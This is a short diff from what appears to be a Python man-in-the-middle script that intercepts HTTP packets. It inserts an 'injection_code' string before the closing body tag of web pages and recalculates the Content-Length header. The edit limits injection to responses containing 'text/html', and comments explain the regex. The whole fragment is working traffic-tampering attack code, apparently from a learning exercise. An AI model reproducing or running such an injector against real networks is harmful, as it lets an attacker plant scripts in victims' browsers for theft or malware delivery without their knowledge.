@@ -29,7 +29,8 @@ def process_packet(packet):
             load = load.replace("</body>", injection_code + "</body>")
 #use regex to search for Content-Length in entire packet; ?: will search for item but not return it
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            if content_length_search:
+#add text/html so only html files are modified
+            if content_length_search and "text/html" in load:
 #group(1) matches second item from entire str above (\d*) digits
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
